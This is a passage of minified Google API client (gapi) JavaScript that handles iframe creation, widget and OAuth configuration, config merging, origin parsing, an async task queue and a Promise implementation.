        var b = a;
        return (
          nf.test(a) &&
            ((b = Ca("iframes/" + b.substring(1) + "/url")),
            D(!!b, "Unknown iframe url config for - " + a)),
          Ud($c, b.replace(of, pf))
        );
      },
      rf = function (a, b, c) {
        var d = (c = c || {}).attributes || {};
        D(
          !(c.allowPost || c.forcePost) || !d.onload,
          "onload is not supported by post iframe (allowPost or forcePost)"
        ),
          (a = qf(a)),
          (d = b.ownerDocument || $c);
        var e = hf(d, c);
        a = kf(d, a, e, c);
        var f = c,
          g = md();
        nd(ef, g),
          nd(f.attributes, g),
          (g.name = g.id = e),
          (g.src = a),
          (c.eurl = a);
        var h = !!(c = (f = c) || {}).allowPost;
        if (c.forcePost || (h && 2e3 < a.length)) {
          if (
            ((c = Qd(a)),
            (g.src = ""),
            f.dropDataPostorigin || (g["data-postorigin"] = a),
            (a = mf(d, b, g, e)),
            -1 != navigator.userAgent.indexOf("WebKit"))
          ) {
            var l = a.contentWindow.document;
            l.open(), (g = l.createElement("div"));
            var m = e + "_inner";
            ((h = {}).name = m),
              (h.src = ""),
              (h.style = "display:none"),
              mf(d, g, h, m, f);
          }
          for (
            g = (f = c.query[0]) ? f.split("&") : [], f = [], h = 0;
            h < g.length;
            h++
          )
            (m = g[h].split("=", 2)),
              f.push([decodeURIComponent(m[0]), decodeURIComponent(m[1])]);
          for (
            c.query = [],
              g = Rd(c),
              D(Vd.test(g), "Invalid URL: " + g),
              (c = d.createElement("form")).method = "POST",
              c.target = e,
              c.style.display = "none",
              void 0 !== (e = kc(g)) && (c.action = e),
              e = 0;
            e < f.length;
            e++
          )
            ((g = d.createElement("input")).type = "hidden"),
              (g.name = f[e][0]),
              (g.value = f[e][1]),
              c.appendChild(g);
          b.appendChild(c),
            c.submit(),
            c.parentNode.removeChild(c),
            l && l.close(),
            (b = a);
        } else b = mf(d, b, g, e, f);
        return b;
      };
    (window.osapi = window.osapi || {}),
      (window.___jsl = window.___jsl || {}),
      (window.___jsl.cd = window.___jsl.cd || []).push({
        gwidget: { parsetags: "explicit" },
        appsapi: { plus_one_service: "/plus/v1" },
        csi: { rate: 0.01 },
        poshare: { hangoutContactPickerServer: "https://plus.google.com" },
        gappsutil: {
          required_scopes: [
            "https://www.googleapis.com/auth/plus.me",
            "https://www.googleapis.com/auth/plus.people.recommended",
          ],
          display_on_page_ready: !1,
        },
        appsutil: {
          required_scopes: [
            "https://www.googleapis.com/auth/plus.me",
            "https://www.googleapis.com/auth/plus.people.recommended",
          ],
          display_on_page_ready: !1,
        },
        "oauth-flow": {
          authUrl: "https://accounts.google.com/o/oauth2/auth",
          proxyUrl: "https://accounts.google.com/o/oauth2/postmessageRelay",
          redirectUri: "postmessage",
        },
        iframes: {
          sharebox: {
            params: { json: "&" },
            url: ":socialhost:/:session_prefix:_/sharebox/dialog",
          },
          plus: {
            url: ":socialhost:/:session_prefix:_/widget/render/badge?usegapi=1",
          },
          ":socialhost:": "https://apis.google.com",
          ":im_socialhost:": "https://plus.googleapis.com",
          domains_suggest: { url: "https://domains.google.com/suggest/flow" },
          card: {
            params: { s: "#", userid: "&" },
            url: ":socialhost:/:session_prefix:_/hovercard/internalcard",
          },
          ":signuphost:": "https://plus.google.com",
          ":gplus_url:": "https://plus.google.com",
          plusone: {
            url: ":socialhost:/:session_prefix:_/+1/fastbutton?usegapi=1",
          },
          plus_share: {
            url: ":socialhost:/:session_prefix:_/+1/sharebutton?plusShare=true&usegapi=1",
          },
          plus_circle: {
            url: ":socialhost:/:session_prefix:_/widget/plus/circle?usegapi=1",
          },
          plus_followers: {
            url: ":socialhost:/_/im/_/widget/render/plus/followers?usegapi=1",
          },
          configurator: {
            url: ":socialhost:/:session_prefix:_/plusbuttonconfigurator?usegapi=1",
          },
          appcirclepicker: {
            url: ":socialhost:/:session_prefix:_/widget/render/appcirclepicker",
          },
          page: {
            url: ":socialhost:/:session_prefix:_/widget/render/page?usegapi=1",
          },
          person: {
            url: ":socialhost:/:session_prefix:_/widget/render/person?usegapi=1",
          },
          community: {
            url: ":ctx_socialhost:/:session_prefix::im_prefix:_/widget/render/community?usegapi=1",
          },
          follow: {
            url: ":socialhost:/:session_prefix:_/widget/render/follow?usegapi=1",
          },
          commentcount: {
            url: ":socialhost:/:session_prefix:_/widget/render/commentcount?usegapi=1",
          },
          comments: {
            url: ":socialhost:/:session_prefix:_/widget/render/comments?usegapi=1",
          },
          youtube: {
            url: ":socialhost:/:session_prefix:_/widget/render/youtube?usegapi=1",
          },
          reportabuse: {
            url: ":socialhost:/:session_prefix:_/widget/render/reportabuse?usegapi=1",
          },
          additnow: { url: ":socialhost:/additnow/additnow.html" },
          appfinder: {
            url: "https://workspace.google.com/:session_prefix:marketplace/appfinder?usegapi=1",
          },
          ":source:": "1p",
        },
        poclient: { update_session: "google.updateSessionCallback" },
        "googleapis.config": {
          rpc: "/rpc",
          root: "https://content.googleapis.com",
          "root-1p": "https://clients6.google.com",
          useGapiForXd3: !0,
          xd3: "/static/proxy.html",
          auth: { useInterimAuth: !1 },
        },
        report: {
          apis: [
            "iframes\\..*",
            "gadgets\\..*",
            "gapi\\.appcirclepicker\\..*",
            "gapi\\.client\\..*",
          ],
          rate: 1e-4,
        },
        client: { perApiBatch: !0 },
      });
    var sf = function (a) {
        var b = (window.___jsl = window.___jsl || {});
        return (b[a] = b[a] || []), b[a];
      },
      tf = function (a) {
        var b = (window.___jsl = window.___jsl || {});
        return (b.cfg = (!a && b.cfg) || {}), b.cfg;
      },
      uf = function (a) {
        return "object" == typeof a && /\[native code\]/.test(a.push);
      },
      vf = function (a, b, c) {
        if (b && "object" == typeof b)
          for (var d in b)
            !Object.prototype.hasOwnProperty.call(b, d) ||
              (c && "___goc" === d && void 0 === b[d]) ||
              (a[d] &&
              b[d] &&
              "object" == typeof a[d] &&
              "object" == typeof b[d] &&
              !uf(a[d]) &&
              !uf(b[d])
                ? vf(a[d], b[d])
                : b[d] && "object" == typeof b[d]
                ? ((a[d] = uf(b[d]) ? [] : {}), vf(a[d], b[d]))
                : (a[d] = b[d]));
      },
      wf = function (a) {
        if (a && !/^\s+$/.test(a)) {
          for (; 0 == a.charCodeAt(a.length - 1); )
            a = a.substring(0, a.length - 1);
          try {
            var b = window.JSON.parse(a);
          } catch (c) {}
          if ("object" == typeof b) return b;
          try {
            b = new Function("return (" + a + "\n)")();
          } catch (c) {}
          if ("object" == typeof b) return b;
          try {
            b = new Function("return ({" + a + "\n})")();
          } catch (c) {}
          return "object" == typeof b ? b : {};
        }
      },
      xf = function (a, b) {
        var c = { ___goc: void 0 };
        a.length &&
          a[a.length - 1] &&
          Object.hasOwnProperty.call(a[a.length - 1], "___goc") &&
          void 0 === a[a.length - 1].___goc &&
          (c = a.pop()),
          vf(c, b),
          a.push(c);
      },
      yf = function (a) {
        tf(!0);
        var b = window.___gcfg,
          c = sf("cu"),
          d = window.___gu;
        b && b !== d && (xf(c, b), (window.___gu = b)), (b = sf("cu"));
        var e =
          document.scripts || document.getElementsByTagName("script") || [];
        d = [];
        var f = [];
        f.push.apply(f, sf("us"));
        for (var g = 0; g < e.length; ++g)
          for (var h = e[g], l = 0; l < f.length; ++l)
            h.src && 0 == h.src.indexOf(f[l]) && d.push(h);
        for (
          0 == d.length &&
            0 < e.length &&
            e[e.length - 1].src &&
            d.push(e[e.length - 1]),
            e = 0;
          e < d.length;
          ++e
        )
          d[e].getAttribute("gapi_processed") ||
            (d[e].setAttribute("gapi_processed", !0),
            (f = d[e])
              ? (f =
                  3 == (g = f.nodeType) || 4 == g
                    ? f.nodeValue
                    : f.textContent || "")
              : (f = void 0),
            (f = wf(f)) && b.push(f));
        for (a && xf(c, a), a = 0, b = (d = sf("cd")).length; a < b; ++a)
          vf(tf(), d[a], !0);
        for (a = 0, b = (d = sf("ci")).length; a < b; ++a) vf(tf(), d[a], !0);
        for (a = 0, b = c.length; a < b; ++a) vf(tf(), c[a], !0);
      },
      zf = function () {
        var a = window.__GOOGLEAPIS;
        a &&
          (a.googleapis &&
            !a["googleapis.config"] &&
            (a["googleapis.config"] = a.googleapis),
          bd(de, "ci", []).push(a),
          (window.__GOOGLEAPIS = void 0));
      };
    zf && zf(),
      yf(),
      r("gapi.config.get", function (a, b) {
        var c = tf();
        if (!a) return c;
        for (
          var d = 0, e = (a = a.split("/")).length;
          c && "object" == typeof c && d < e;
          ++d
        )
          c = c[a[d]];
        return d === a.length && void 0 !== c ? c : b;
      }),
      r("gapi.config.update", function (a, b) {
        var c;
        if ("string" == typeof a) {
          for (
            var d = (c = {}), e = 0, f = (a = a.split("/")).length;
            e < f - 1;
            ++e
          ) {
            d = d[a[e]] = {};
          }
          d[a[e]] = b;
        } else c = a;
        yf(c);
      });
    var Af = function (a) {
        if (!a) return "";
        if (/^about:(?:blank|srcdoc)$/.test(a)) return window.origin || "";
        a.startsWith("blob:") && (a = a.substring(5)),
          0 ==
            (a = (a = a.split("#")[0].split("?")[0]).toLowerCase()).indexOf(
              "//"
            ) && (a = window.location.protocol + a),
          /^[\w\-]*:\/\//.test(a) || (a = window.location.href);
        var b = a.substring(a.indexOf("://") + 3),
          c = b.indexOf("/");
        if (
          (-1 != c && (b = b.substring(0, c)),
          !(c = a.substring(0, a.indexOf("://"))))
        )
          throw Error("URI is missing protocol: " + a);
        if (
          "http" !== c &&
          "https" !== c &&
          "chrome-extension" !== c &&
          "moz-extension" !== c &&
          "file" !== c &&
          "android-app" !== c &&
          "chrome-search" !== c &&
          "chrome-untrusted" !== c &&
          "chrome" !== c &&
          "app" !== c &&
          "devtools" !== c
        )
          throw Error("Invalid URI scheme in origin: " + c);
        a = "";
        var d = b.indexOf(":");
        if (-1 != d) {
          var e = b.substring(d + 1);
          (b = b.substring(0, d)),
            (("http" === c && "80" !== e) || ("https" === c && "443" !== e)) &&
              (a = ":" + e);
        }
        return c + "://" + b + a;
      },
      Df = function (a) {
        (this.lb = a), (this.Context = Bf(a)), (this.Iframe = Cf(a));
      };
    function Bf(a) {
      var b = function (c) {
        return new (a().Context)(c);
      };
      return (
        (b.prototype.addOnConnectHandler = function (c, d, e, f) {
          return a().Context.prototype.addOnConnectHandler.apply(this, [
            c,
            d,
            e,
            f,
          ]);
        }),
        (b.prototype.addOnOpenerHandler = function (c, d, e) {
          return a().Context.prototype.addOnOpenerHandler.apply(this, [
            c,
            d,
            e,
          ]);
        }),
        (b.prototype.closeSelf = function (c, d, e) {
          return a().Context.prototype.closeSelf.apply(this, [c, d, e]);
        }),
        (b.prototype.connectIframes = function (c, d) {
          a().Context.prototype.connectIframes.apply(this, [c, d]);
        }),
        (b.prototype.getFrameName = function () {
          return a().Context.prototype.getFrameName.apply(this);
        }),
        (b.prototype.getGlobalParam = function (c) {
          a().Context.prototype.getGlobalParam.apply(this, [c]);
        }),
        (b.prototype.getParentIframe = function () {
          return a().Context.prototype.getParentIframe.apply(this);
        }),
        (b.prototype.getWindow = function () {
          return a().Context.prototype.getWindow.apply(this);
        }),
        (b.prototype.isDisposed = function () {
          return a().Context.prototype.isDisposed.apply(this);
        }),
        (b.prototype.open = function (c, d) {
          return a().Context.prototype.open.apply(this, [c, d]);
        }),
        (b.prototype.openChild = function (c) {
          return a().Context.prototype.openChild.apply(this, [c]);
        }),
        (b.prototype.ready = function (c, d, e, f) {
          a().Context.prototype.ready.apply(this, [c, d, e, f]);
        }),
        (b.prototype.removeOnConnectHandler = function (c) {
          a().Context.prototype.removeOnConnectHandler.apply(this, [c]);
        }),
        (b.prototype.restyleSelf = function (c, d, e) {
          return a().Context.prototype.restyleSelf.apply(this, [c, d, e]);
        }),
        (b.prototype.setCloseSelfFilter = function (c) {
          a().Context.prototype.setCloseSelfFilter.apply(this, [c]);
        }),
        (b.prototype.setGlobalParam = function (c, d) {
          a().Context.prototype.setGlobalParam.apply(this, [c, d]);
        }),
        (b.prototype.setRestyleSelfFilter = function (c) {
          a().Context.prototype.setRestyleSelfFilter.apply(this, [c]);
        }),
        b
      );
    }
    function Cf(a) {
      var b = function (c, d, e, f) {
        return new (a().Iframe)(c, d, e, f);
      };
      return (
        (b.prototype.applyIframesApi = function (c) {
          a().Iframe.prototype.applyIframesApi(c);
        }),
        (b.prototype.close = function (c, d) {
          return a().Iframe.prototype.close.apply(this, [c, d]);
        }),
        (b.prototype.getContext = function () {
          return a().Iframe.prototype.getContext.apply(this, []);
        }),
        (b.prototype.getFrameName = function () {
          return a().Iframe.prototype.getFrameName.apply(this, []);
        }),
        (b.prototype.getId = function () {
          return a().Iframe.prototype.getId.apply(this, []);
        }),
        (b.prototype.getIframeEl = function () {
          return a().Iframe.prototype.getIframeEl.apply(this, []);
        }),
        (b.prototype.getOrigin = function () {
          return a().Iframe.prototype.getOrigin.apply(this, []);
        }),
        (b.prototype.getParam = function (c) {
          a().Iframe.prototype.getParam.apply(this, [c]);
        }),
        (b.prototype.getSiteEl = function () {
          return a().Iframe.prototype.getSiteEl.apply(this, []);
        }),
        (b.prototype.getWindow = function () {
          return a().Iframe.prototype.getWindow.apply(this, []);
        }),
        (b.prototype.isDisposed = function () {
          return a().Iframe.prototype.isDisposed.apply(this, []);
        }),
        (b.prototype.ping = function (c, d) {
          return a().Iframe.prototype.ping.apply(this, [c, d]);
        }),
        (b.prototype.register = function (c, d, e) {
          a().Iframe.prototype.register.apply(this, [c, d, e]);
        }),
        (b.prototype.registerWasClosed = function (c, d) {
          a().Iframe.prototype.registerWasClosed.apply(this, [c, d]);
        }),
        (b.prototype.registerWasRestyled = function (c, d) {
          a().Iframe.prototype.registerWasRestyled.apply(this, [c, d]);
        }),
        (b.prototype.restyle = function (c, d) {
          return a().Iframe.prototype.restyle.apply(this, [c, d]);
        }),
        (b.prototype.send = function (c, d, e, f) {
          return a().Iframe.prototype.send.apply(this, [c, d, e, f]);
        }),
        (b.prototype.setParam = function (c, d) {
          a().Iframe.prototype.setParam.apply(this, [c, d]);
        }),
        (b.prototype.setSiteEl = function (c) {
          a().Iframe.prototype.setSiteEl.apply(this, [c]);
        }),
        (b.prototype.unregister = function (c, d) {
          a().Iframe.prototype.unregister.apply(this, [c, d]);
        }),
        b
      );
    }
    function Ef(a, b) {
      if ((b = void 0 === b ? new Set() : b).has(a))
        return "(Recursive reference)";
      switch (typeof a) {
        case "object":
          if (a) {
            var c = Object.getPrototypeOf(a);
            switch (c) {
              case Map.prototype:
              case Set.prototype:
              case Array.prototype:
                b.add(a);
                var d =
                  "[" +
                  Array.from(a, function (e) {
                    return Ef(e, b);
                  }).join(", ") +
                  "]";
                return (
                  b.delete(a),
                  c !== Array.prototype &&
                    (d = Ff(c.constructor) + "(" + d + ")"),
                  d
                );
              case Object.prototype:
                return (
                  b.add(a),
                  (c =
                    "{" +
                    Object.entries(a)
                      .map(function (e) {
                        var f = ja(e);
                        return (
                          (e = f.next().value) +
                          ": " +
                          Ef((f = f.next().value), b)
                        );
                      })
                      .join(", ") +
                    "}"),
                  b.delete(a),
                  c
                );
              default:
                return (
                  (d = "Object"),
                  c && c.constructor && (d = Ff(c.constructor)),
                  "function" == typeof a.toString &&
                  a.toString !== Object.prototype.toString
                    ? d + "(" + String(a) + ")"
                    : "(object " + d + ")"
                );
            }
          }
          break;
        case "function":
          return "function " + Ff(a);
        case "number":
          if (!Number.isFinite(a)) return String(a);
          break;
        case "bigint":
          return a.toString(10) + "n";
        case "symbol":
          return a.toString();
      }
      return JSON.stringify(a);
    }
    function Ff(a) {
      var b = a.name;
      return (
        b ||
          (b = (a = /function\s+([^\(]+)/m.exec(String(a)))
            ? a[1]
            : "(Anonymous)"),
        b
      );
    }
    function Gf(a) {
      var b = Hf,
        c = If;
      If = void 0;
      var d = [];
      Jf(b, a, d) ||
        Kf.apply(
          null,
          [void 0, c, "Guard " + b.Bi().trim() + " failed:"].concat(
            ka(d.reverse())
          )
        );
    }
    function Jf(a, b, c) {
      var d = a(b, c);
      return (
        d ||
          Lf(c, function () {
            var e = "";
            return (
              0 < e.length && (e += ": "),
              e + "Expected " + a.Bi().trim() + ", got " + Ef(b)
            );
          }),
        d
      );
    }
    function Lf(a, b) {
      null == a || a.push(("function" == typeof b ? b() : b).trim());
    }
    (k = Df.prototype),
      (k.CROSS_ORIGIN_IFRAMES_FILTER = function (a) {
        return this.lb().CROSS_ORIGIN_IFRAMES_FILTER(a);
      }),
      (k.SAME_ORIGIN_IFRAMES_FILTER = function (a) {
        return this.lb().SAME_ORIGIN_IFRAMES_FILTER(a);
      }),
      (k.create = function (a, b, c) {
        return this.lb().create(a, b, c);
      }),
      (k.getBeforeOpenStyle = function (a) {
        return this.lb().getBeforeOpenStyle(a);
      }),
      (k.getContext = function () {
        return this.lb().getContext();
      }),
      (k.getStyle = function (a) {
        return this.lb().getStyle(a);
      }),
      (k.makeWhiteListIframesFilter = function (a) {
        return this.lb().makeWhiteListIframesFilter(a);
      }),
      (k.registerBeforeOpenStyle = function (a, b) {
        return this.lb().registerBeforeOpenStyle(a, b);
      }),
      (k.registerIframesApi = function (a, b, c) {
        return this.lb().registerIframesApi(a, b, c);
      }),
      (k.registerIframesApiHandler = function (a, b, c) {
        return this.lb().registerIframesApiHandler(a, b, c);
      }),
      (k.registerStyle = function (a, b) {
        return this.lb().registerStyle(a, b);
      });
    var If = void 0;
    function Kf() {
      throw Error(
        ra
          .apply(0, arguments)
          .map(function (a) {
            return "function" == typeof a ? a() : a;
          })
          .filter(function (a) {
            return a;
          })
          .join("\n")
          .trim()
          .replace(/:$/, "")
      );
    }
    var Hf = (function (a, b) {
        return (
          (a.Bi = function () {
            return b;
          }),
          a
        );
      })(function (a) {
        return null != a;
      }, "exists"),
      Mf = function () {
        (this.Bb = []), (this.ki = this.qk = this.kk = !1);
      };
    Mf.prototype.lb = function (a) {
      return (this.ki = !0), this.Bb.length ? Nf(this, this.Bb[0], a) : void 0;
    };
    var Nf = function (a, b, c) {
        return (
          (c =
            void 0 === c
              ? function (d) {
                  return new d();
                }
              : c),
          b.Te
            ? ((c = c(b.Te)), a.qk && (delete b.Te, (b.instance = c)), c)
            : b.instance
        );
      },
      Of = function () {
        Mf.apply(this, arguments);
      };
    n(Of, Mf);
    var Qf = function (a) {
        var b = Pf.ji;
        w(b.kk || !b.ki, "Cannot register new delegates after instantiation.");
        var c = a.priority,
          d = ~Va(b.Bb, function (f) {
            return f.priority < c ? -1 : 1;
          }),
          e = 0 < d ? b.Bb[d - 1] : null;
        e &&
          e.priority <= c &&
          w(
            !1,
            "two delegates registered with same priority (%s): %s and %s",
            c,
            e.Te || e.instance,
            a.Te || a.instance
          ),
          b.Bb.splice(d, 0, a);
      },
      Pf = new (function () {
        var a = this;
        (this.ji = new Of()),
          (this.instance = new Df(function () {
            var b = a.ji.lb();
            return Gf(b), b();
          }));
      })();
    Qf({
      instance: function () {
        var a = window.gapi;
        return Gf(a), Gf((a = a.iframes)), a;
      },
      priority: 1,
    });
    var Rf = { height: !0, width: !0 },
      Sf =
        /^(?!-*(?:expression|(?:moz-)?binding))(?:[.#]?-?(?:[_a-z0-9-]+)(?:-[_a-z0-9-]+)*-?|-?(?:[0-9]+(?:\.[0-9]*)?|\.[0-9]+)(?:[a-z]{1,2}|%)?|!important|)$/i,
      Tf = function (a) {
        return "number" == typeof a && (a = String(a) + "px"), a;
      },
      Uf = function (a, b) {
        (this.wl = 100),
          (this.xk = a),
          (this.Ul = b),
          (this.yf = 0),
          (this.df = null);
      };
    (Uf.prototype.get = function () {
      if (0 < this.yf) {
        this.yf--;
        var a = this.df;
        (this.df = a.next), (a.next = null);
      } else a = this.xk();
      return a;
    }),
      (Uf.prototype.put = function (a) {
        this.Ul(a),
          this.yf < this.wl && (this.yf++, (a.next = this.df), (this.df = a));
      });
    var Vf,
      Wf = function () {
        var a = p.MessageChannel;
        if (
          (void 0 === a &&
            "undefined" != typeof window &&
            window.postMessage &&
            window.addEventListener &&
            !A("Presto") &&
            (a = function () {
              var e = Uc(document, "IFRAME");
              (e.style.display = "none"),
                document.documentElement.appendChild(e);
              var f = e.contentWindow;
              (e = f.document).open(), e.close();
              var g = "callImmediate" + Math.random(),
                h =
                  "file:" == f.location.protocol
                    ? "*"
                    : f.location.protocol + "//" + f.location.host;
              (e = u(function (l) {
                ("*" != h && l.origin != h) ||
                  l.data != g ||
                  this.port1.onmessage();
              }, this)),
                f.addEventListener("message", e, !1),
                (this.port1 = {}),
                (this.port2 = {
                  postMessage: function () {
                    f.postMessage(g, h);
                  },
                });
            }),
          void 0 !== a && !Nb())
        ) {
          var b = new a(),
            c = {},
            d = c;
          return (
            (b.port1.onmessage = function () {
              if (void 0 !== c.next) {
                var e = (c = c.next).cb;
                (c.cb = null), e();
              }
            }),
            function (e) {
              (d.next = { cb: e }), (d = d.next), b.port2.postMessage(0);
            }
          );
        }
        return function (e) {
          p.setTimeout(e, 0);
        };
      };
    function Xf(a) {
      p.setTimeout(function () {
        throw a;
      }, 0);
    }
    var Yf = function () {
      this.Xf = this.Xc = null;
    };
    (Yf.prototype.add = function (a, b) {
      var c = Zf.get();
      c.set(a, b),
        this.Xf ? (this.Xf.next = c) : (w(!this.Xc), (this.Xc = c)),
        (this.Xf = c);
    }),
      (Yf.prototype.remove = function () {
        var a = null;
        return (
          this.Xc &&
            ((a = this.Xc),
            (this.Xc = this.Xc.next),
            this.Xc || (this.Xf = null),
            (a.next = null)),
          a
        );
      });
    var Zf = new Uf(
        function () {
          return new $f();
        },
        function (a) {
          return a.reset();
        }
      ),
      $f = function () {
        this.next = this.scope = this.Xd = null;
      };
    ($f.prototype.set = function (a, b) {
      (this.Xd = a), (this.scope = b), (this.next = null);
    }),
      ($f.prototype.reset = function () {
        this.next = this.scope = this.Xd = null;
      });
    var ag =
        p.console && p.console.createTask
          ? p.console.createTask.bind(p.console)
          : void 0,
      bg = ag ? Symbol("consoleTask") : void 0,
      dg;
    function cg(a, b) {
      function c() {
        var h = ra.apply(0, arguments),
          l = this;
        return g.run(function () {
          return a.call.apply(a, [l].concat(ka(h)));
        });
      }
      if (((b = void 0 === b ? "anonymous" : b), bg && a[bg])) return a;
      var e,
        d = a,
        f = null == (e = dg) ? void 0 : e();
      if (
        ((a = function () {
          var l,
            h = ra.apply(0, arguments),
            m = null == (l = dg) ? void 0 : l();
          if (f !== m)
            throw Error(
              b +
                " was scheduled in '" +
                f +
                "' but called in '" +
                m +
                "'.\nMake sure your test awaits all async calls.\n\nTIP: To help investigate, debug the test in Chrome and look at the async portion\nof the call stack to see what originally scheduled the callback.  Then, make the\ntest wait for the relevant asynchronous work to finish."
            );
          return d.call.apply(d, [this].concat(ka(h)));
        }),
        !ag)
      )
        return a;
      var g = ag(a.name || b);
      return (c[Ha(bg)] = g), c;
    }
    var eg,
      fg = !1,
      gg = new Yf(),
      ig = function (a, b) {
        eg || hg(),
          fg || (eg(), (fg = !0)),
          (a = cg(a, "goog.async.run")),
          gg.add(a, b);
      },
      hg = function () {
        if (p.Promise && p.Promise.resolve) {
          var a = p.Promise.resolve(void 0);
          eg = function () {
            a.then(jg);
          };
        } else
          eg = function () {
            var b = jg;
            "function" != typeof p.setImmediate ||
            (p.Window &&
              p.Window.prototype &&
              (Mb() || !A("Edge")) &&
              p.Window.prototype.setImmediate == p.setImmediate)
              ? (Vf || (Vf = Wf()), Vf(b))
              : p.setImmediate(b);
          };
      },
      jg = function () {
        for (var a; (a = gg.remove()); ) {
          try {
            a.Xd.call(a.scope);
          } catch (b) {
            Xf(b);
          }
          Zf.put(a);
        }
        fg = !1;
      },
      kg = function (a) {
        if (!a) return !1;
        try {
          return !!a.$goog_Thenable;
        } catch (b) {
          return !1;
        }
      },
      E = function (a, b) {
        if (
          ((this.Ba = 0),
          (this.Ua = void 0),
          (this.Zc = this.Wb = this.Ha = null),
          (this.Ye = this.Cg = !1),
          a != Ic)
        )
          try {
            var c = this;
            a.call(
              b,
              function (d) {
                lg(c, 2, d);
              },
              function (d) {
                if (!(d instanceof mg))
                  try {
                    if (d instanceof Error) throw d;
                    throw Error("Promise rejected.");
                  } catch (e) {}
                lg(c, 3, d);
              }
            );
          } catch (d) {
            lg(this, 3, d);
          }
      },
      ng = function () {
        (this.next = this.context = this.vd = this.Qc = this.child = null),
          (this.Pd = !1);
      };
    ng.prototype.reset = function () {
      (this.context = this.vd = this.Qc = this.child = null), (this.Pd = !1);
    };
    var og = new Uf(
        function () {
          return new ng();
        },
        function (a) {
          a.reset();
        }
      ),
      pg = function (a, b, c) {
        var d = og.get();
        return (d.Qc = a), (d.vd = b), (d.context = c), d;
      },
      F = function (a) {
        if (a instanceof E) return a;
        var b = new E(Ic);
        return lg(b, 2, a), b;
      },
      G = function (a) {
        return new E(function (b, c) {
          c(a);
        });
      },
      rg = function (a, b, c) {
        qg(a, b, c, null) || ig(za(b, a));
      },
      sg = function (a) {
        return new E(function (b, c) {
          var d = a.length,
            e = [];
          if (d)
            for (
              var l,
                f = function (m, q) {
                  d--, (e[m] = q), 0 == d && b(e);
                },
                g = function (m) {
                  c(m);
                },
                h = 0;
              h < a.length;
              h++
            )
              (l = a[h]), rg(l, za(f, h), g);
          else b(e);
        });
      },
      tg = function (a) {
        return new E(function (b) {
          var c = a.length,
            d = [];
          if (c)
            for (
              var g,
                e = function (h, l, m) {
                  c--,
                    (d[h] = l ? { vi: !0, value: m } : { vi: !1, reason: m }),
                    0 == c && b(d);
                },
                f = 0;
              f < a.length;
              f++
            )
              (g = a[f]), rg(g, za(e, f, !0), za(e, f, !1));
          else b(d);
        });
      };
    (E.prototype.then = function (a, b, c) {
      return (
        null != a && Ka(a, "opt_onFulfilled should be a function."),
        null != b &&
          Ka(
            b,
            "opt_onRejected should be a function. Did you pass opt_context as the second argument instead of the third?"
          ),
        ug(
          this,
          "function" == typeof a ? a : null,
          "function" == typeof b ? b : null,
          c
        )
      );
    }),
      (E.prototype.$goog_Thenable = !0),
      (E.prototype.Ac = function (a, b) {
        return ((a = pg(a, a, b)).Pd = !0), vg(this, a), this;
      }),
      (E.prototype.l = function (a, b) {
        return ug(this, null, a, b);
      }),
      (E.prototype.catch = E.prototype.l),
      (E.prototype.cancel = function (a) {
        if (0 == this.Ba) {
          var b = new mg(a);
          ig(function () {
            wg(this, b);
          }, this);
        }
      });
    var wg = function (a, b) {
        if (0 == a.Ba)
          if (a.Ha) {
            var c = a.Ha;
            if (c.Wb) {
              for (
                var d = 0, e = null, f = null, g = c.Wb;
                g && (g.Pd || (d++, g.child == a && (e = g), !(e && 1 < d)));
                g = g.next
              )
                e || (f = g);
              e &&
                (0 == c.Ba && 1 == d
                  ? wg(c, b)
                  : (f
                      ? ((d = f),
                        w(c.Wb),
                        w(null != d),
                        d.next == c.Zc && (c.Zc = d),
                        (d.next = d.next.next))
                      : xg(c),
                    yg(c, e, 3, b)));
            }
            a.Ha = null;
          } else lg(a, 3, b);
      },
      vg = function (a, b) {
        a.Wb || (2 != a.Ba && 3 != a.Ba) || zg(a),
          w(null != b.Qc),
          a.Zc ? (a.Zc.next = b) : (a.Wb = b),
          (a.Zc = b);
      },
      ug = function (a, b, c, d) {
        b && (b = cg(b, "goog.Promise.then")),
          c && (c = cg(c, "goog.Promise.then"));
        var e = pg(null, null, null);
        return (
          (e.child = new E(function (f, g) {
            (e.Qc = b
              ? function (h) {
                  try {
                    var l = b.call(d, h);
                    f(l);
                  } catch (m) {
                    g(m);
                  }
                }
              : f),
              (e.vd = c
                ? function (h) {
                    try {
                      var l = c.call(d, h);
                      void 0 === l && h instanceof mg ? g(h) : f(l);
                    } catch (m) {
                      g(m);
                    }
                  }
                : g);
          })),
          (e.child.Ha = a),
          vg(a, e),
          e.child
        );
      };
    (E.prototype.um = function (a) {
      w(1 == this.Ba), (this.Ba = 0), lg(this, 2, a);
    }),
      (E.prototype.vm = function (a) {
        w(1 == this.Ba), (this.Ba = 0), lg(this, 3, a);
      });
    var lg = function (a, b, c) {
        0 == a.Ba &&
          (a === c &&
            ((b = 3), (c = new TypeError("Promise cannot resolve to itself"))),
          (a.Ba = 1),
          qg(c, a.um, a.vm, a) ||
            ((a.Ua = c),
            (a.Ba = b),
            (a.Ha = null),
            zg(a),
            3 != b || c instanceof mg || Ag(a, c)));
      },
      qg = function (a, b, c, d) {
        if (a instanceof E)
          return (
            null != b && Ka(b, "opt_onFulfilled should be a function."),
            null != c &&
              Ka(
                c,
                "opt_onRejected should be a function. Did you pass opt_context as the second argument instead of the third?"
              ),
            vg(a, pg(b || Ic, c || null, d)),
            !0
          );
        if (kg(a)) return a.then(b, c, d), !0;
        if (t(a))
          try {
            var e = a.then;
            if ("function" == typeof e) return Bg(a, e, b, c, d), !0;
          } catch (f) {
            return c.call(d, f), !0;
          }
        return !1;
      },
      Bg = function (a, b, c, d, e) {
        var f = !1,
          h = function (l) {
            f || ((f = !0), d.call(e, l));
          };
        try {
          b.call(
            a,
            function (l) {
              f || ((f = !0), c.call(e, l));
            },
            h
          );
        } catch (l) {
          h(l);
        }
      },
      zg = function (a) {
        a.Cg || ((a.Cg = !0), ig(a.Gk, a));
      },
      xg = function (a) {
        var b = null;
        return (
          a.Wb && ((b = a.Wb), (a.Wb = b.next), (b.next = null)),
          a.Wb || (a.Zc = null),
          null != b && w(null != b.Qc),
          b
        );
      };
    E.prototype.Gk = function () {
      for (var a; (a = xg(this)); ) yg(this, a, this.Ba, this.Ua);
      this.Cg = !1;
    };
    var yg = function (a, b, c, d) {
        if (3 == c && b.vd && !b.Pd) for (; a && a.Ye; a = a.Ha) a.Ye = !1;
        if (b.child) (b.child.Ha = null), Cg(b, c, d);
        else
          try {
            b.Pd ? b.Qc.call(b.context) : Cg(b, c, d);
          } catch (e) {
            Dg.call(null, e);
          }
        og.put(b);
      },
      Cg = function (a, b, c) {
        2 == b ? a.Qc.call(a.context, c) : a.vd && a.vd.call(a.context, c);
